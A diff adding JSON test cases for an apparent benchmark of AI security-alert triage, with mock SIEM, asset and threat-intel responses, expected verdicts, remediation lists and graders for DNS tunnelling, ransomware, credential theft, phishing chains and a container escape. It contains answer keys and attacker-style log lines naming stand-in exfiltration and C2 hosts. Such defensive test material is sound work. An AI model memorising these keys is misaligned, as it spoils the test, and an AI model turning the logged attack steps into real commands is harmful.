+        "geo_location": null,
+        "source": "Internal",
+        "confidence": "high",
+        "raw_intel": "Internal authorized AppSec scanner. No external threat."
+      },
+      "query_related_alerts_10.0.5.110_48h": {
+        "query_params": { "ip": "10.0.5.110", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_asset_info"],
+      "expected_judgment": {
+        "severity": "false_positive",
+        "attack_type": "none",
+        "min_confidence": 0.95,
+        "key_evidence_must_include": [
+          "源 IP 10.0.5.110 资产标签 is_scanner=true，属于应用安全扫描器",
+          "威胁情报无恶意记录",
+          "扫描时间与 AppSec 团队排程一致"
+        ],
+        "key_evidence_must_not_include": ["外部黑客正在探测 Web 漏洞"]
+      },
+      "expected_remediation_must_include": [
+        "将扫描器 IP 加入 WAF 白名单，防止产生无效告警"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail 和 asset_info" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A23",
+    "scenario": "DNS 隧道数据外泄，关联 Webshell 和命令执行",
+    "difficulty": "hard",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "data_exfiltration",
+    "input": {
+      "alert_id": "A23",
+      "trigger_context": "网络流量分析检测到大量异常 DNS TXT 查询，疑似通过 DNS 隧道泄露数据，目标域名 data.exfil.example。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A23": {
+        "alert_id": "A23",
+        "severity_original": "critical",
+        "rule_name": "DNS Tunneling - High Entropy TXT Queries to Suspicious Domain",
+        "source": "SIEM-Core",
+        "timestamp": "2026-07-14T02:10:33Z",
+        "raw_log": "Host 10.0.2.150 sent 4500 TXT queries to data.exfil.example in 30 minutes, payload base64 encoded.",
+        "source_ip": "10.0.2.150",
+        "destination_ip": "192.0.2.77",
+        "source_port": 57234,
+        "destination_port": 53,
+        "protocol": "UDP",
+        "payload_highlights": ["4500 TXT queries in 30 min", "base64 encoded data in queries", "domain data.exfil.example"],
+        "related_iocs": [
+          { "type": "domain", "value": "data.exfil.example" },
+          { "type": "ip", "value": "10.0.2.150" }
+        ]
+      },
+      "query_asset_info_10.0.2.150": {
+        "ip": "10.0.2.150",
+        "hostname": "web-db-03",
+        "os": "Ubuntu 20.04",
+        "department": "核心业务部",
+        "business_system": "用户资料数据库",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "dba@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["database", "pii", "critical"]
+      },
+      "query_threat_intel_domain_data.exfil.example": {
+        "ioc_type": "domain",
+        "ioc_value": "data.exfil.example",
+        "is_malicious": true,
+        "reputation_score": 8,
+        "threat_tags": ["data_exfiltration", "dns_tunnel"],
+        "associated_apt": "APT29",
+        "first_seen": "2026-07-01",
+        "last_seen": "2026-07-14",
+        "geo_location": null,
+        "source": "Recorded Future, Farsight DNSDB",
+        "confidence": "high",
+        "raw_intel": "Domain used by APT29 for DNS tunneling in recent campaigns targeting databases containing PII."
+      },
+      "query_related_alerts_10.0.2.150_48h": {
+        "query_params": { "ip": "10.0.2.150", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 2,
+        "related_alerts": [
+          {
+            "alert_id": "A23-REL-01",
+            "alert_type": "WebShell Upload",
+            "severity": "critical",
+            "timestamp": "2026-07-13T20:15:00Z",
+            "summary": "WebShell uploaded to web server 10.0.2.150 via file upload vulnerability."
+          },
+          {
+            "alert_id": "A23-REL-02",
+            "alert_type": "Suspicious Command Execution",
+            "severity": "high",
+            "timestamp": "2026-07-14T01:45:00Z",
+            "summary": "WebShell executed mysqldump command to extract database tables."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "data_exfiltration",
+        "min_confidence": 0.92,
+        "key_evidence_must_include": [
+          "DNS 隧道使用高熵 TXT 查询向已知 APT29 外泄域名传输数据",
+          "关联告警构成攻击链：WebShell 上传 -> 命令执行导出数据库 -> DNS 隧道外泄",
+          "受感染主机是核心用户数据库，泄露 PII"
+        ],
+        "key_evidence_must_not_include": ["DNS 查询是正常的服务发现"]
+      },
+      "expected_remediation_must_include": [
+        "立即切断 10.0.2.150 网络，阻断 DNS 查询到 data.exfil.example",
+        "删除 WebShell，修补上传漏洞",
+        "评估泄露数据量，启动数据泄露通知程序",
+        "在 DNS 层部署隧道检测规则"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A24",
+    "scenario": "勒索软件通过永恒之蓝和 PsExec 横向传播",
+    "difficulty": "hard",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "ransomware",
+    "input": {
+      "alert_id": "A24",
+      "trigger_context": "EDR 在 3 台服务器上同时检测到文件加密和勒索信，关联告警显示利用 MS17-010 和 PsExec 扩散。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A24": {
+        "alert_id": "A24",
+        "severity_original": "critical",
+        "rule_name": "Ransomware Outbreak - Multiple Hosts Encrypted",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-12T03:50:00Z",
+        "raw_log": "Encryptor.exe executed on 10.0.1.45, 10.0.1.46, 10.0.1.47. Files renamed to .crypt extension. Ransom note 'READ_ME.html'.",
+        "source_ip": "10.0.1.45",
+        "destination_ip": null,
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": [".crypt extension", "ransom note READ_ME.html", "multiple hosts affected simultaneously"],
+        "related_iocs": [
+          { "type": "hash", "value": "c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9" }
+        ]
+      },
+      "query_asset_info_10.0.1.45": {
+        "ip": "10.0.1.45",
+        "hostname": "app-srv-12",
+        "os": "Windows Server 2016",
+        "department": "核心业务部",
+        "business_system": "订单处理系统",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "app.team@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["application", "critical"]
+      },
+      "query_threat_intel_hash_c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9": {
+        "ioc_type": "hash",
+        "ioc_value": "c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9",
+        "is_malicious": true,
+        "reputation_score": 2,
+        "threat_tags": ["ransomware", "worm"],
+        "associated_apt": null,
+        "first_seen": "2026-07-11",
+        "last_seen": "2026-07-12",
+        "geo_location": null,
+        "source": "VirusTotal, MalwareBazaar",
+        "confidence": "high",
+        "raw_intel": "Ransomware sample with worm capability exploiting MS17-010 and using PsExec for lateral movement."
+      },
+      "query_related_alerts_10.0.1.45_48h": {
+        "query_params": { "ip": "10.0.1.45", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 3,
+        "related_alerts": [
+          {
+            "alert_id": "A24-REL-01",
+            "alert_type": "Exploit MS17-010",
+            "severity": "critical",
+            "timestamp": "2026-07-12T03:20:00Z",
+            "summary": "External host 192.0.2.60 exploited MS17-010 against 10.0.1.45 and delivered ransomware payload."
+          },
+          {
+            "alert_id": "A24-REL-02",
+            "alert_type": "PsExec Lateral Movement",
+            "severity": "high",
+            "timestamp": "2026-07-12T03:35:00Z",
+            "summary": "PsExec used from 10.0.1.45 to deploy encryptor to 10.0.1.46 and 10.0.1.47."
+          },
+          {
+            "alert_id": "A24-REL-03",
+            "alert_type": "C2 Beacon",
+            "severity": "high",
+            "timestamp": "2026-07-12T03:55:00Z",
+            "summary": "Encrypted hosts beacon to 198.51.100.250 over HTTPS."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "ransomware",
+        "min_confidence": 0.94,
+        "key_evidence_must_include": [
+          "勒索软件利用永恒之蓝漏洞初始入侵，横向使用 PsExec",
+          "关联告警完整呈现 Exploit→Lateral→Encryption→C2 攻击链",
+          "涉及多台核心服务器，影响订单处理"
+        ],
+        "key_evidence_must_not_include": ["加密行为是管理员测试备份恢复"]
+      },
+      "expected_remediation_must_include": [
+        "立即切断所有受影响服务器的网络，阻断 C2 通信",
+        "安装 MS17-010 补丁在所有 Windows 系统",
+        "从离线备份恢复数据，删除加密文件",
+        "全网加强网络分段，限制 PsExec 和 SMB 流量"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A25",
+    "scenario": "APT28 横向移动：窃取凭据后计划任务横向",
+    "difficulty": "hard",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "credential_dump",
+    "input": {
+      "alert_id": "A25",
+      "trigger_context": "EDR 告警：域控制器 10.0.1.10 检测到可疑计划任务创建，源自已被入侵的工作站，疑似 APT28 横向移动。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A25": {
+        "alert_id": "A25",
+        "severity_original": "critical",
+        "rule_name": "Lateral Movement via Scheduled Task - Possible APT28 TTP",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-13T11:22:33Z",
+        "raw_log": "Task 'At1' created on DC01 to execute powershell -enc ... from remote IP 10.0.3.90 using domain admin creds.",
+        "source_ip": "10.0.3.90",
+        "destination_ip": "10.0.1.10",
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": ["schtasks /create /s DC01 ... /ru domain\\admin", "encoded PowerShell payload"],
+        "related_iocs": [
+          { "type": "ip", "value": "10.0.3.90" }
+        ]
+      },
+      "query_asset_info_10.0.1.10": {
+        "ip": "10.0.1.10",
+        "hostname": "dc01",
+        "os": "Windows Server 2022",
+        "department": "运维部",
+        "business_system": "主域控制器",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "domain.admin@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["domain-controller", "critical"]
+      },
+      "query_threat_intel_ip_10.0.3.90": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.3.90",
+        "is_malicious": false,
+        "reputation_score": 50,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal",
+        "confidence": "low",
+        "raw_intel": "This is an internal workstation. Suspicious due to behavior, not IP reputation."
+      },
+      "query_related_alerts_10.0.3.90_48h": {
+        "query_params": { "ip": "10.0.3.90", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 3,
+        "related_alerts": [
+          {
+            "alert_id": "A25-REL-01",
+            "alert_type": "Phishing Email Delivered",
+            "severity": "high",
+            "timestamp": "2026-07-12T09:30:00Z",
+            "summary": "User on 10.0.3.90 received spear-phishing email with malicious attachment from APT28 infrastructure."
+          },
+          {
+            "alert_id": "A25-REL-02",
+            "alert_type": "Credential Dump (Mimikatz)",
+            "severity": "high",
+            "timestamp": "2026-07-12T14:45:00Z",
+            "summary": "Mimikatz executed on 10.0.3.90 harvesting domain admin credentials."
+          },
+          {
+            "alert_id": "A25-REL-03",
+            "alert_type": "Reconnaissance (BloodHound)",
+            "severity": "medium",
+            "timestamp": "2026-07-13T08:10:00Z",
+            "summary": "BloodHound collection run from 10.0.3.90 mapping AD attack paths."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "credential_dump",
+        "min_confidence": 0.90,
+        "key_evidence_must_include": [
+          "攻击链：鱼叉邮件 → Mimikatz 窃取域管凭据 → BloodHound 侦察 → 计划任务横向到域控",
+          "目标为域控制器，拥有最高权限",
+          "TTP 符合 APT28 常用工具和技术"
+        ],
+        "key_evidence_must_not_include": ["横向移动是管理员正常运维脚本"]
+      },
+      "expected_remediation_must_include": [
+        "立即隔离工作站 10.0.3.90 和域控 DC01，中断攻击者控制",
+        "重置所有域管理员密码和 KRBTGT 账户两次",
+        "清除恶意的计划任务和 PowerShell 后门",
+        "排查自钓鱼邮件以来的所有访问和修改"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A26",
+    "scenario": "研发测试服务器执行数据清理脚本被误判为数据泄露（误报）",
+    "difficulty": "hard",
+    "is_positive": false,
+    "expected_severity": "false_positive",
+    "expected_attack_type": "insider_threat",
+    "input": {
+      "alert_id": "A26",
+      "trigger_context": "DLP 告警：主机 10.0.9.45 在凌晨删除了 20GB 的测试数据并通过 FTP 传出，疑似内部威胁。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A26": {
+        "alert_id": "A26",
+        "severity_original": "high",
+        "rule_name": "Data Exfiltration - Large File Transfer via FTP",
+        "source": "DLP",
+        "timestamp": "2026-07-14T02:00:15Z",
+        "raw_log": "Host 10.0.9.45 sent 20GB of *.dat files to 10.0.9.100 via FTP, after deleting local copies.",
+        "source_ip": "10.0.9.45",
+        "destination_ip": "10.0.9.100",
+        "source_port": 34521,
+        "destination_port": 21,
+        "protocol": "TCP",
+        "payload_highlights": ["20GB transfer", "files deleted after transfer", "FTP to internal server"],
+        "related_iocs": []
+      },
+      "query_asset_info_10.0.9.45": {
+        "ip": "10.0.9.45",
+        "hostname": "qa-testdb-01",
+        "os": "CentOS 8",
+        "department": "研发中心",
+        "business_system": "QA 测试数据库",
+        "asset_level": "low",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "qa.team@company.com",
+        "network_zone": "测试环境",
+        "tags": ["testing", "qa", "non-production"]
+      },
+      "query_asset_info_10.0.9.100": {
+        "ip": "10.0.9.100",
+        "hostname": "qa-storage-01",
+        "os": "FreeNAS",
+        "department": "研发中心",
+        "business_system": "QA 测试数据归档服务器",
+        "asset_level": "low",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "qa.admin@company.com",
+        "network_zone": "测试环境",
+        "tags": ["storage", "archive", "testing"]
+      },
+      "query_threat_intel_ip_10.0.9.45": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.9.45",
+        "is_malicious": false,
+        "reputation_score": 100,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal",
+        "confidence": "high",
+        "raw_intel": "Internal QA test database server. No external threat. Regular data cleansing task according to QA schedule."
+      },
+      "query_related_alerts_10.0.9.45_48h": {
+        "query_params": { "ip": "10.0.9.45", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 1,
+        "related_alerts": [
+          {
+            "alert_id": "A26-REL-01",
+            "alert_type": "Scheduled Cron Job",
+            "severity": "info",
+            "timestamp": "2026-07-14T02:00:00Z",
+            "summary": "Cron job 'cleanup_and_archive.sh' executed on qa-testdb-01, moving old test data to qa-storage-01."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_asset_info", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "false_positive",
+        "attack_type": "none",
+        "min_confidence": 0.95,
+        "key_evidence_must_include": [
+          "源和目标资产均为测试环境中的 QA 服务器，网络区域标记为测试环境",
+          "关联告警显示计划任务执行清理归档脚本",
+          "无任何威胁情报标记恶意行为"
+        ],
+        "key_evidence_must_not_include": ["内部员工窃取敏感数据", "需要启动应急响应"]
+      },
+      "expected_remediation_must_include": [
+        "将测试环境数据归档任务加入 DLP 白名单，避免干扰",
+        "与 QA 团队确认归档流程合规"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、asset_info、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A27",
+    "scenario": "完整攻击链：钓鱼→宏执行→下载器→C2→横向→数据外传",
+    "difficulty": "hard",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "phishing",
+    "input": {
+      "alert_id": "A27",
+      "trigger_context": "多源告警聚合：用户点击钓鱼邮件后，主机经历多阶段攻击，最终向外部 C2 传出数据。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A27": {
+        "alert_id": "A27",
+        "severity_original": "critical",
+        "rule_name": "Multi-Stage Attack Detected - Phishing to Exfiltration",
+        "source": "SIEM-Core",
+        "timestamp": "2026-07-13T16:20:45Z",
+        "raw_log": "Correlation of events: Phish link clicked -> Macro execution -> PowerShell downloader -> Cobalt Strike beacon -> PsExec lateral -> SQL dump -> exfil via HTTPS.",
+        "source_ip": "10.0.3.110",
+        "destination_ip": "192.0.2.210",
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": ["phishing email with URL", "Word macro spawning PowerShell", "Cobalt Strike C2", "PsExec to database server", "data exfiltration"],
+        "related_iocs": [
+          { "type": "domain", "value": "evil-c2.net" },
+          { "type": "url", "value": "http://phish-delivery.cn/doc/invoice.docm" },
+          { "type": "ip", "value": "192.0.2.210" }
+        ]
+      },
+      "query_asset_info_10.0.3.110": {
+        "ip": "10.0.3.110",
+        "hostname": "finance-ws-01",
+        "os": "Windows 10",
+        "department": "财务部",
+        "business_system": "财务终端",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "cf.li@company.com",
+        "network_zone": "办公网",
+        "tags": ["finance", "workstation"]
+      },
+      "query_asset_info_10.0.1.60": {
+        "ip": "10.0.1.60",
+        "hostname": "erp-db-01",
+        "os": "Windows Server 2019",
+        "department": "财务部",
+        "business_system": "ERP 数据库",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "erp.admin@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["database", "erp", "critical"]
+      },
+      "query_threat_intel_domain_evil-c2.net": {
+        "ioc_type": "domain",
+        "ioc_value": "evil-c2.net",
+        "is_malicious": true,
+        "reputation_score": 2,
+        "threat_tags": ["C2", "cobalt-strike"],
+        "associated_apt": "FIN7",
+        "first_seen": "2026-07-05",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "Mandiant, ThreatConnect",
+        "confidence": "high",
+        "raw_intel": "Cobalt Strike C2 domain used by FIN7 in financially motivated campaigns."
+      },
+      "query_threat_intel_url_http://phish-delivery.cn/doc/invoice.docm": {
+        "ioc_type": "url",
+        "ioc_value": "http://phish-delivery.cn/doc/invoice.docm",
+        "is_malicious": true,
+        "reputation_score": 8,
+        "threat_tags": ["phishing", "macro_malware"],
+        "associated_apt": "FIN7",
+        "first_seen": "2026-07-12",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "URLhaus",
+        "confidence": "high",
+        "raw_intel": "Weaponized document delivering FIN7 macro dropper."
+      },
+      "query_threat_intel_ip_192.0.2.210": {
+        "ioc_type": "ip",
+        "ioc_value": "192.0.2.210",
+        "is_malicious": true,
+        "reputation_score": 10,
+        "threat_tags": ["C2", "exfiltration"],
+        "associated_apt": "FIN7",
+        "first_seen": "2026-07-10",
+        "last_seen": "2026-07-13",
+        "geo_location": "RU",
+        "source": "Recorded Future",
+        "confidence": "high",
+        "raw_intel": "IP used as FIN7 exfiltration endpoint."
+      },
+      "query_related_alerts_10.0.3.110_48h": {
+        "query_params": { "ip": "10.0.3.110", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 5,
+        "related_alerts": [
+          {
+            "alert_id": "A27-REL-01",
+            "alert_type": "Phishing Link Clicked",
+            "severity": "high",
+            "timestamp": "2026-07-13T10:00:00Z",
+            "summary": "User cf.li clicked link to http://phish-delivery.cn/doc/invoice.docm."
+          },
+          {
+            "alert_id": "A27-REL-02",
+            "alert_type": "Suspicious Macro Execution",
+            "severity": "high",
+            "timestamp": "2026-07-13T10:05:00Z",
+            "summary": "Word executed macro that launched PowerShell to download Cobalt Strike."
+          },
+          {
+            "alert_id": "A27-REL-03",
+            "alert_type": "C2 Beacon",
+            "severity": "critical",
+            "timestamp": "2026-07-13T10:10:00Z",
+            "summary": "Cobalt Strike beacon to evil-c2.net established."
+          },
+          {
+            "alert_id": "A27-REL-04",
+            "alert_type": "Lateral Movement (PsExec)",
+            "severity": "high",
+            "timestamp": "2026-07-13T12:00:00Z",
+            "summary": "PsExec used to move from 10.0.3.110 to erp-db-01 (10.0.1.60)."
+          },
+          {
+            "alert_id": "A27-REL-05",
+            "alert_type": "Data Exfiltration",
+            "severity": "critical",
+            "timestamp": "2026-07-13T15:30:00Z",
+            "summary": "Large SQL dump from 10.0.1.60 transferred to 192.0.2.210 over HTTPS."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "phishing",
+        "min_confidence": 0.95,
+        "key_evidence_must_include": [
+          "完整攻击链：钓鱼 → 宏 → Cobalt Strike → 横向 → 数据外泄，全部被关联告警覆盖",
+          "所有 IOC（域名、URL、IP）均被情报确认为 FIN7 基础设施",
+          "最终导致核心 ERP 数据库泄露"
+        ],
+        "key_evidence_must_not_include": ["攻击在早期阶段被阻止", "数据未成功外泄"]
+      },
+      "expected_remediation_must_include": [
+        "隔离所有受影响主机，阻断相关 IOC 通信",
+        "重置所有受影响账户凭据，审查域控日志",
+        "启动全面应急响应，确定数据泄露范围并依法报告"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用所有工具" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A28",
+    "scenario": "容器逃逸后利用内核漏洞提权至宿主机",
+    "difficulty": "hard",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "container_escape",
+    "input": {
+      "alert_id": "A28",
+      "trigger_context": "K8s+EDR 联动：特权容器运行后利用 CVE-2024-2222 内核漏洞提权至宿主机，修改系统文件。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A28": {
+        "alert_id": "A28",
+        "severity_original": "critical",
+        "rule_name": "Container Escape to Host Privilege Escalation",
+        "source": "K8s-Audit",
+        "timestamp": "2026-07-11T06:44:00Z",
+        "raw_log": "Privileged pod escape-pod exploited CVE-2024-2222 in kernel, spawned root shell on host node 10.0.6.75.",
+        "source_ip": "10.0.6.75",
+        "destination_ip": "10.0.6.75",
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": ["privileged container", "CVE-2024-2222 exploit", "host root shell obtained"],
+        "related_iocs": [
+          { "type": "ip", "value": "10.0.6.75" }
+        ]
+      },
+      "query_asset_info_10.0.6.75": {
+        "ip": "10.0.6.75",
+        "hostname": "k8s-worker-prod-07",
+        "os": "Ubuntu 20.04 (vulnerable to CVE-2024-2222)",
+        "department": "研发中心",
+        "business_system": "Kubernetes 生产节点",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "platform@company.com",
+        "network_zone": "容器集群",
+        "tags": ["kubernetes", "production-node"]
+      },
+      "query_threat_intel_ip_10.0.6.75": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.6.75",
+        "is_malicious": false,
+        "reputation_score": 100,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal",
+        "confidence": "low",
+        "raw_intel": "Internal Kubernetes worker node. Exploitation of CVE-2024-2222 is the threat."
+      },
+      "query_related_alerts_10.0.6.75_48h": {
+        "query_params": { "ip": "10.0.6.75", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 2,
+        "related_alerts": [
+          {
+            "alert_id": "A28-REL-01",
+            "alert_type": "Privileged Pod Launched",
+            "severity": "high",
+            "timestamp": "2026-07-11T06:30:00Z",
+            "summary": "User system:serviceaccount:default created privileged pod escape-pod with hostPID and hostNetwork."
+          },
+          {
+            "alert_id": "A28-REL-02",
+            "alert_type": "Kernel Exploit Detected",
+            "severity": "critical",
+            "timestamp": "2026-07-11T06:40:00Z",
+            "summary": "EDR detected exploit attempt targeting CVE-2024-2222 from container escape-pod."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "container_escape",
+        "min_confidence": 0.93,
+        "key_evidence_must_include": [
+          "特权容器利用内核漏洞 CVE-2024-2222 获得宿主机 root 权限",
+          "关联告警显示滥用默认 serviceaccount 创建特权 pod",
+          "宿主机节点运行生产负载，失陷影响大"
+        ],
+        "key_evidence_must_not_include": ["该提权行为是红队演练"]
+      },
+      "expected_remediation_must_include": [
+        "立即隔离节点 k8s-worker-prod-07，驱逐所有 pod",
+        "修补节点内核 CVE-2024-2222，并更新至安全版本",
+        "收紧 RBAC，禁用默认 serviceaccount 创建特权 pod 的权限"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A29",
+    "scenario": "APT41 多阶段攻击：供应链植入后门 → 横向 → 数据窃取 → 勒索",
+    "difficulty": "expert",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "supply_chain",
+    "input": {
+      "alert_id": "A29",
+      "trigger_context": "多个传感器报告：内部软件仓库被植入后门，多台服务器受影响，部分数据被加密，攻击特征与 APT41 重叠。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A29": {
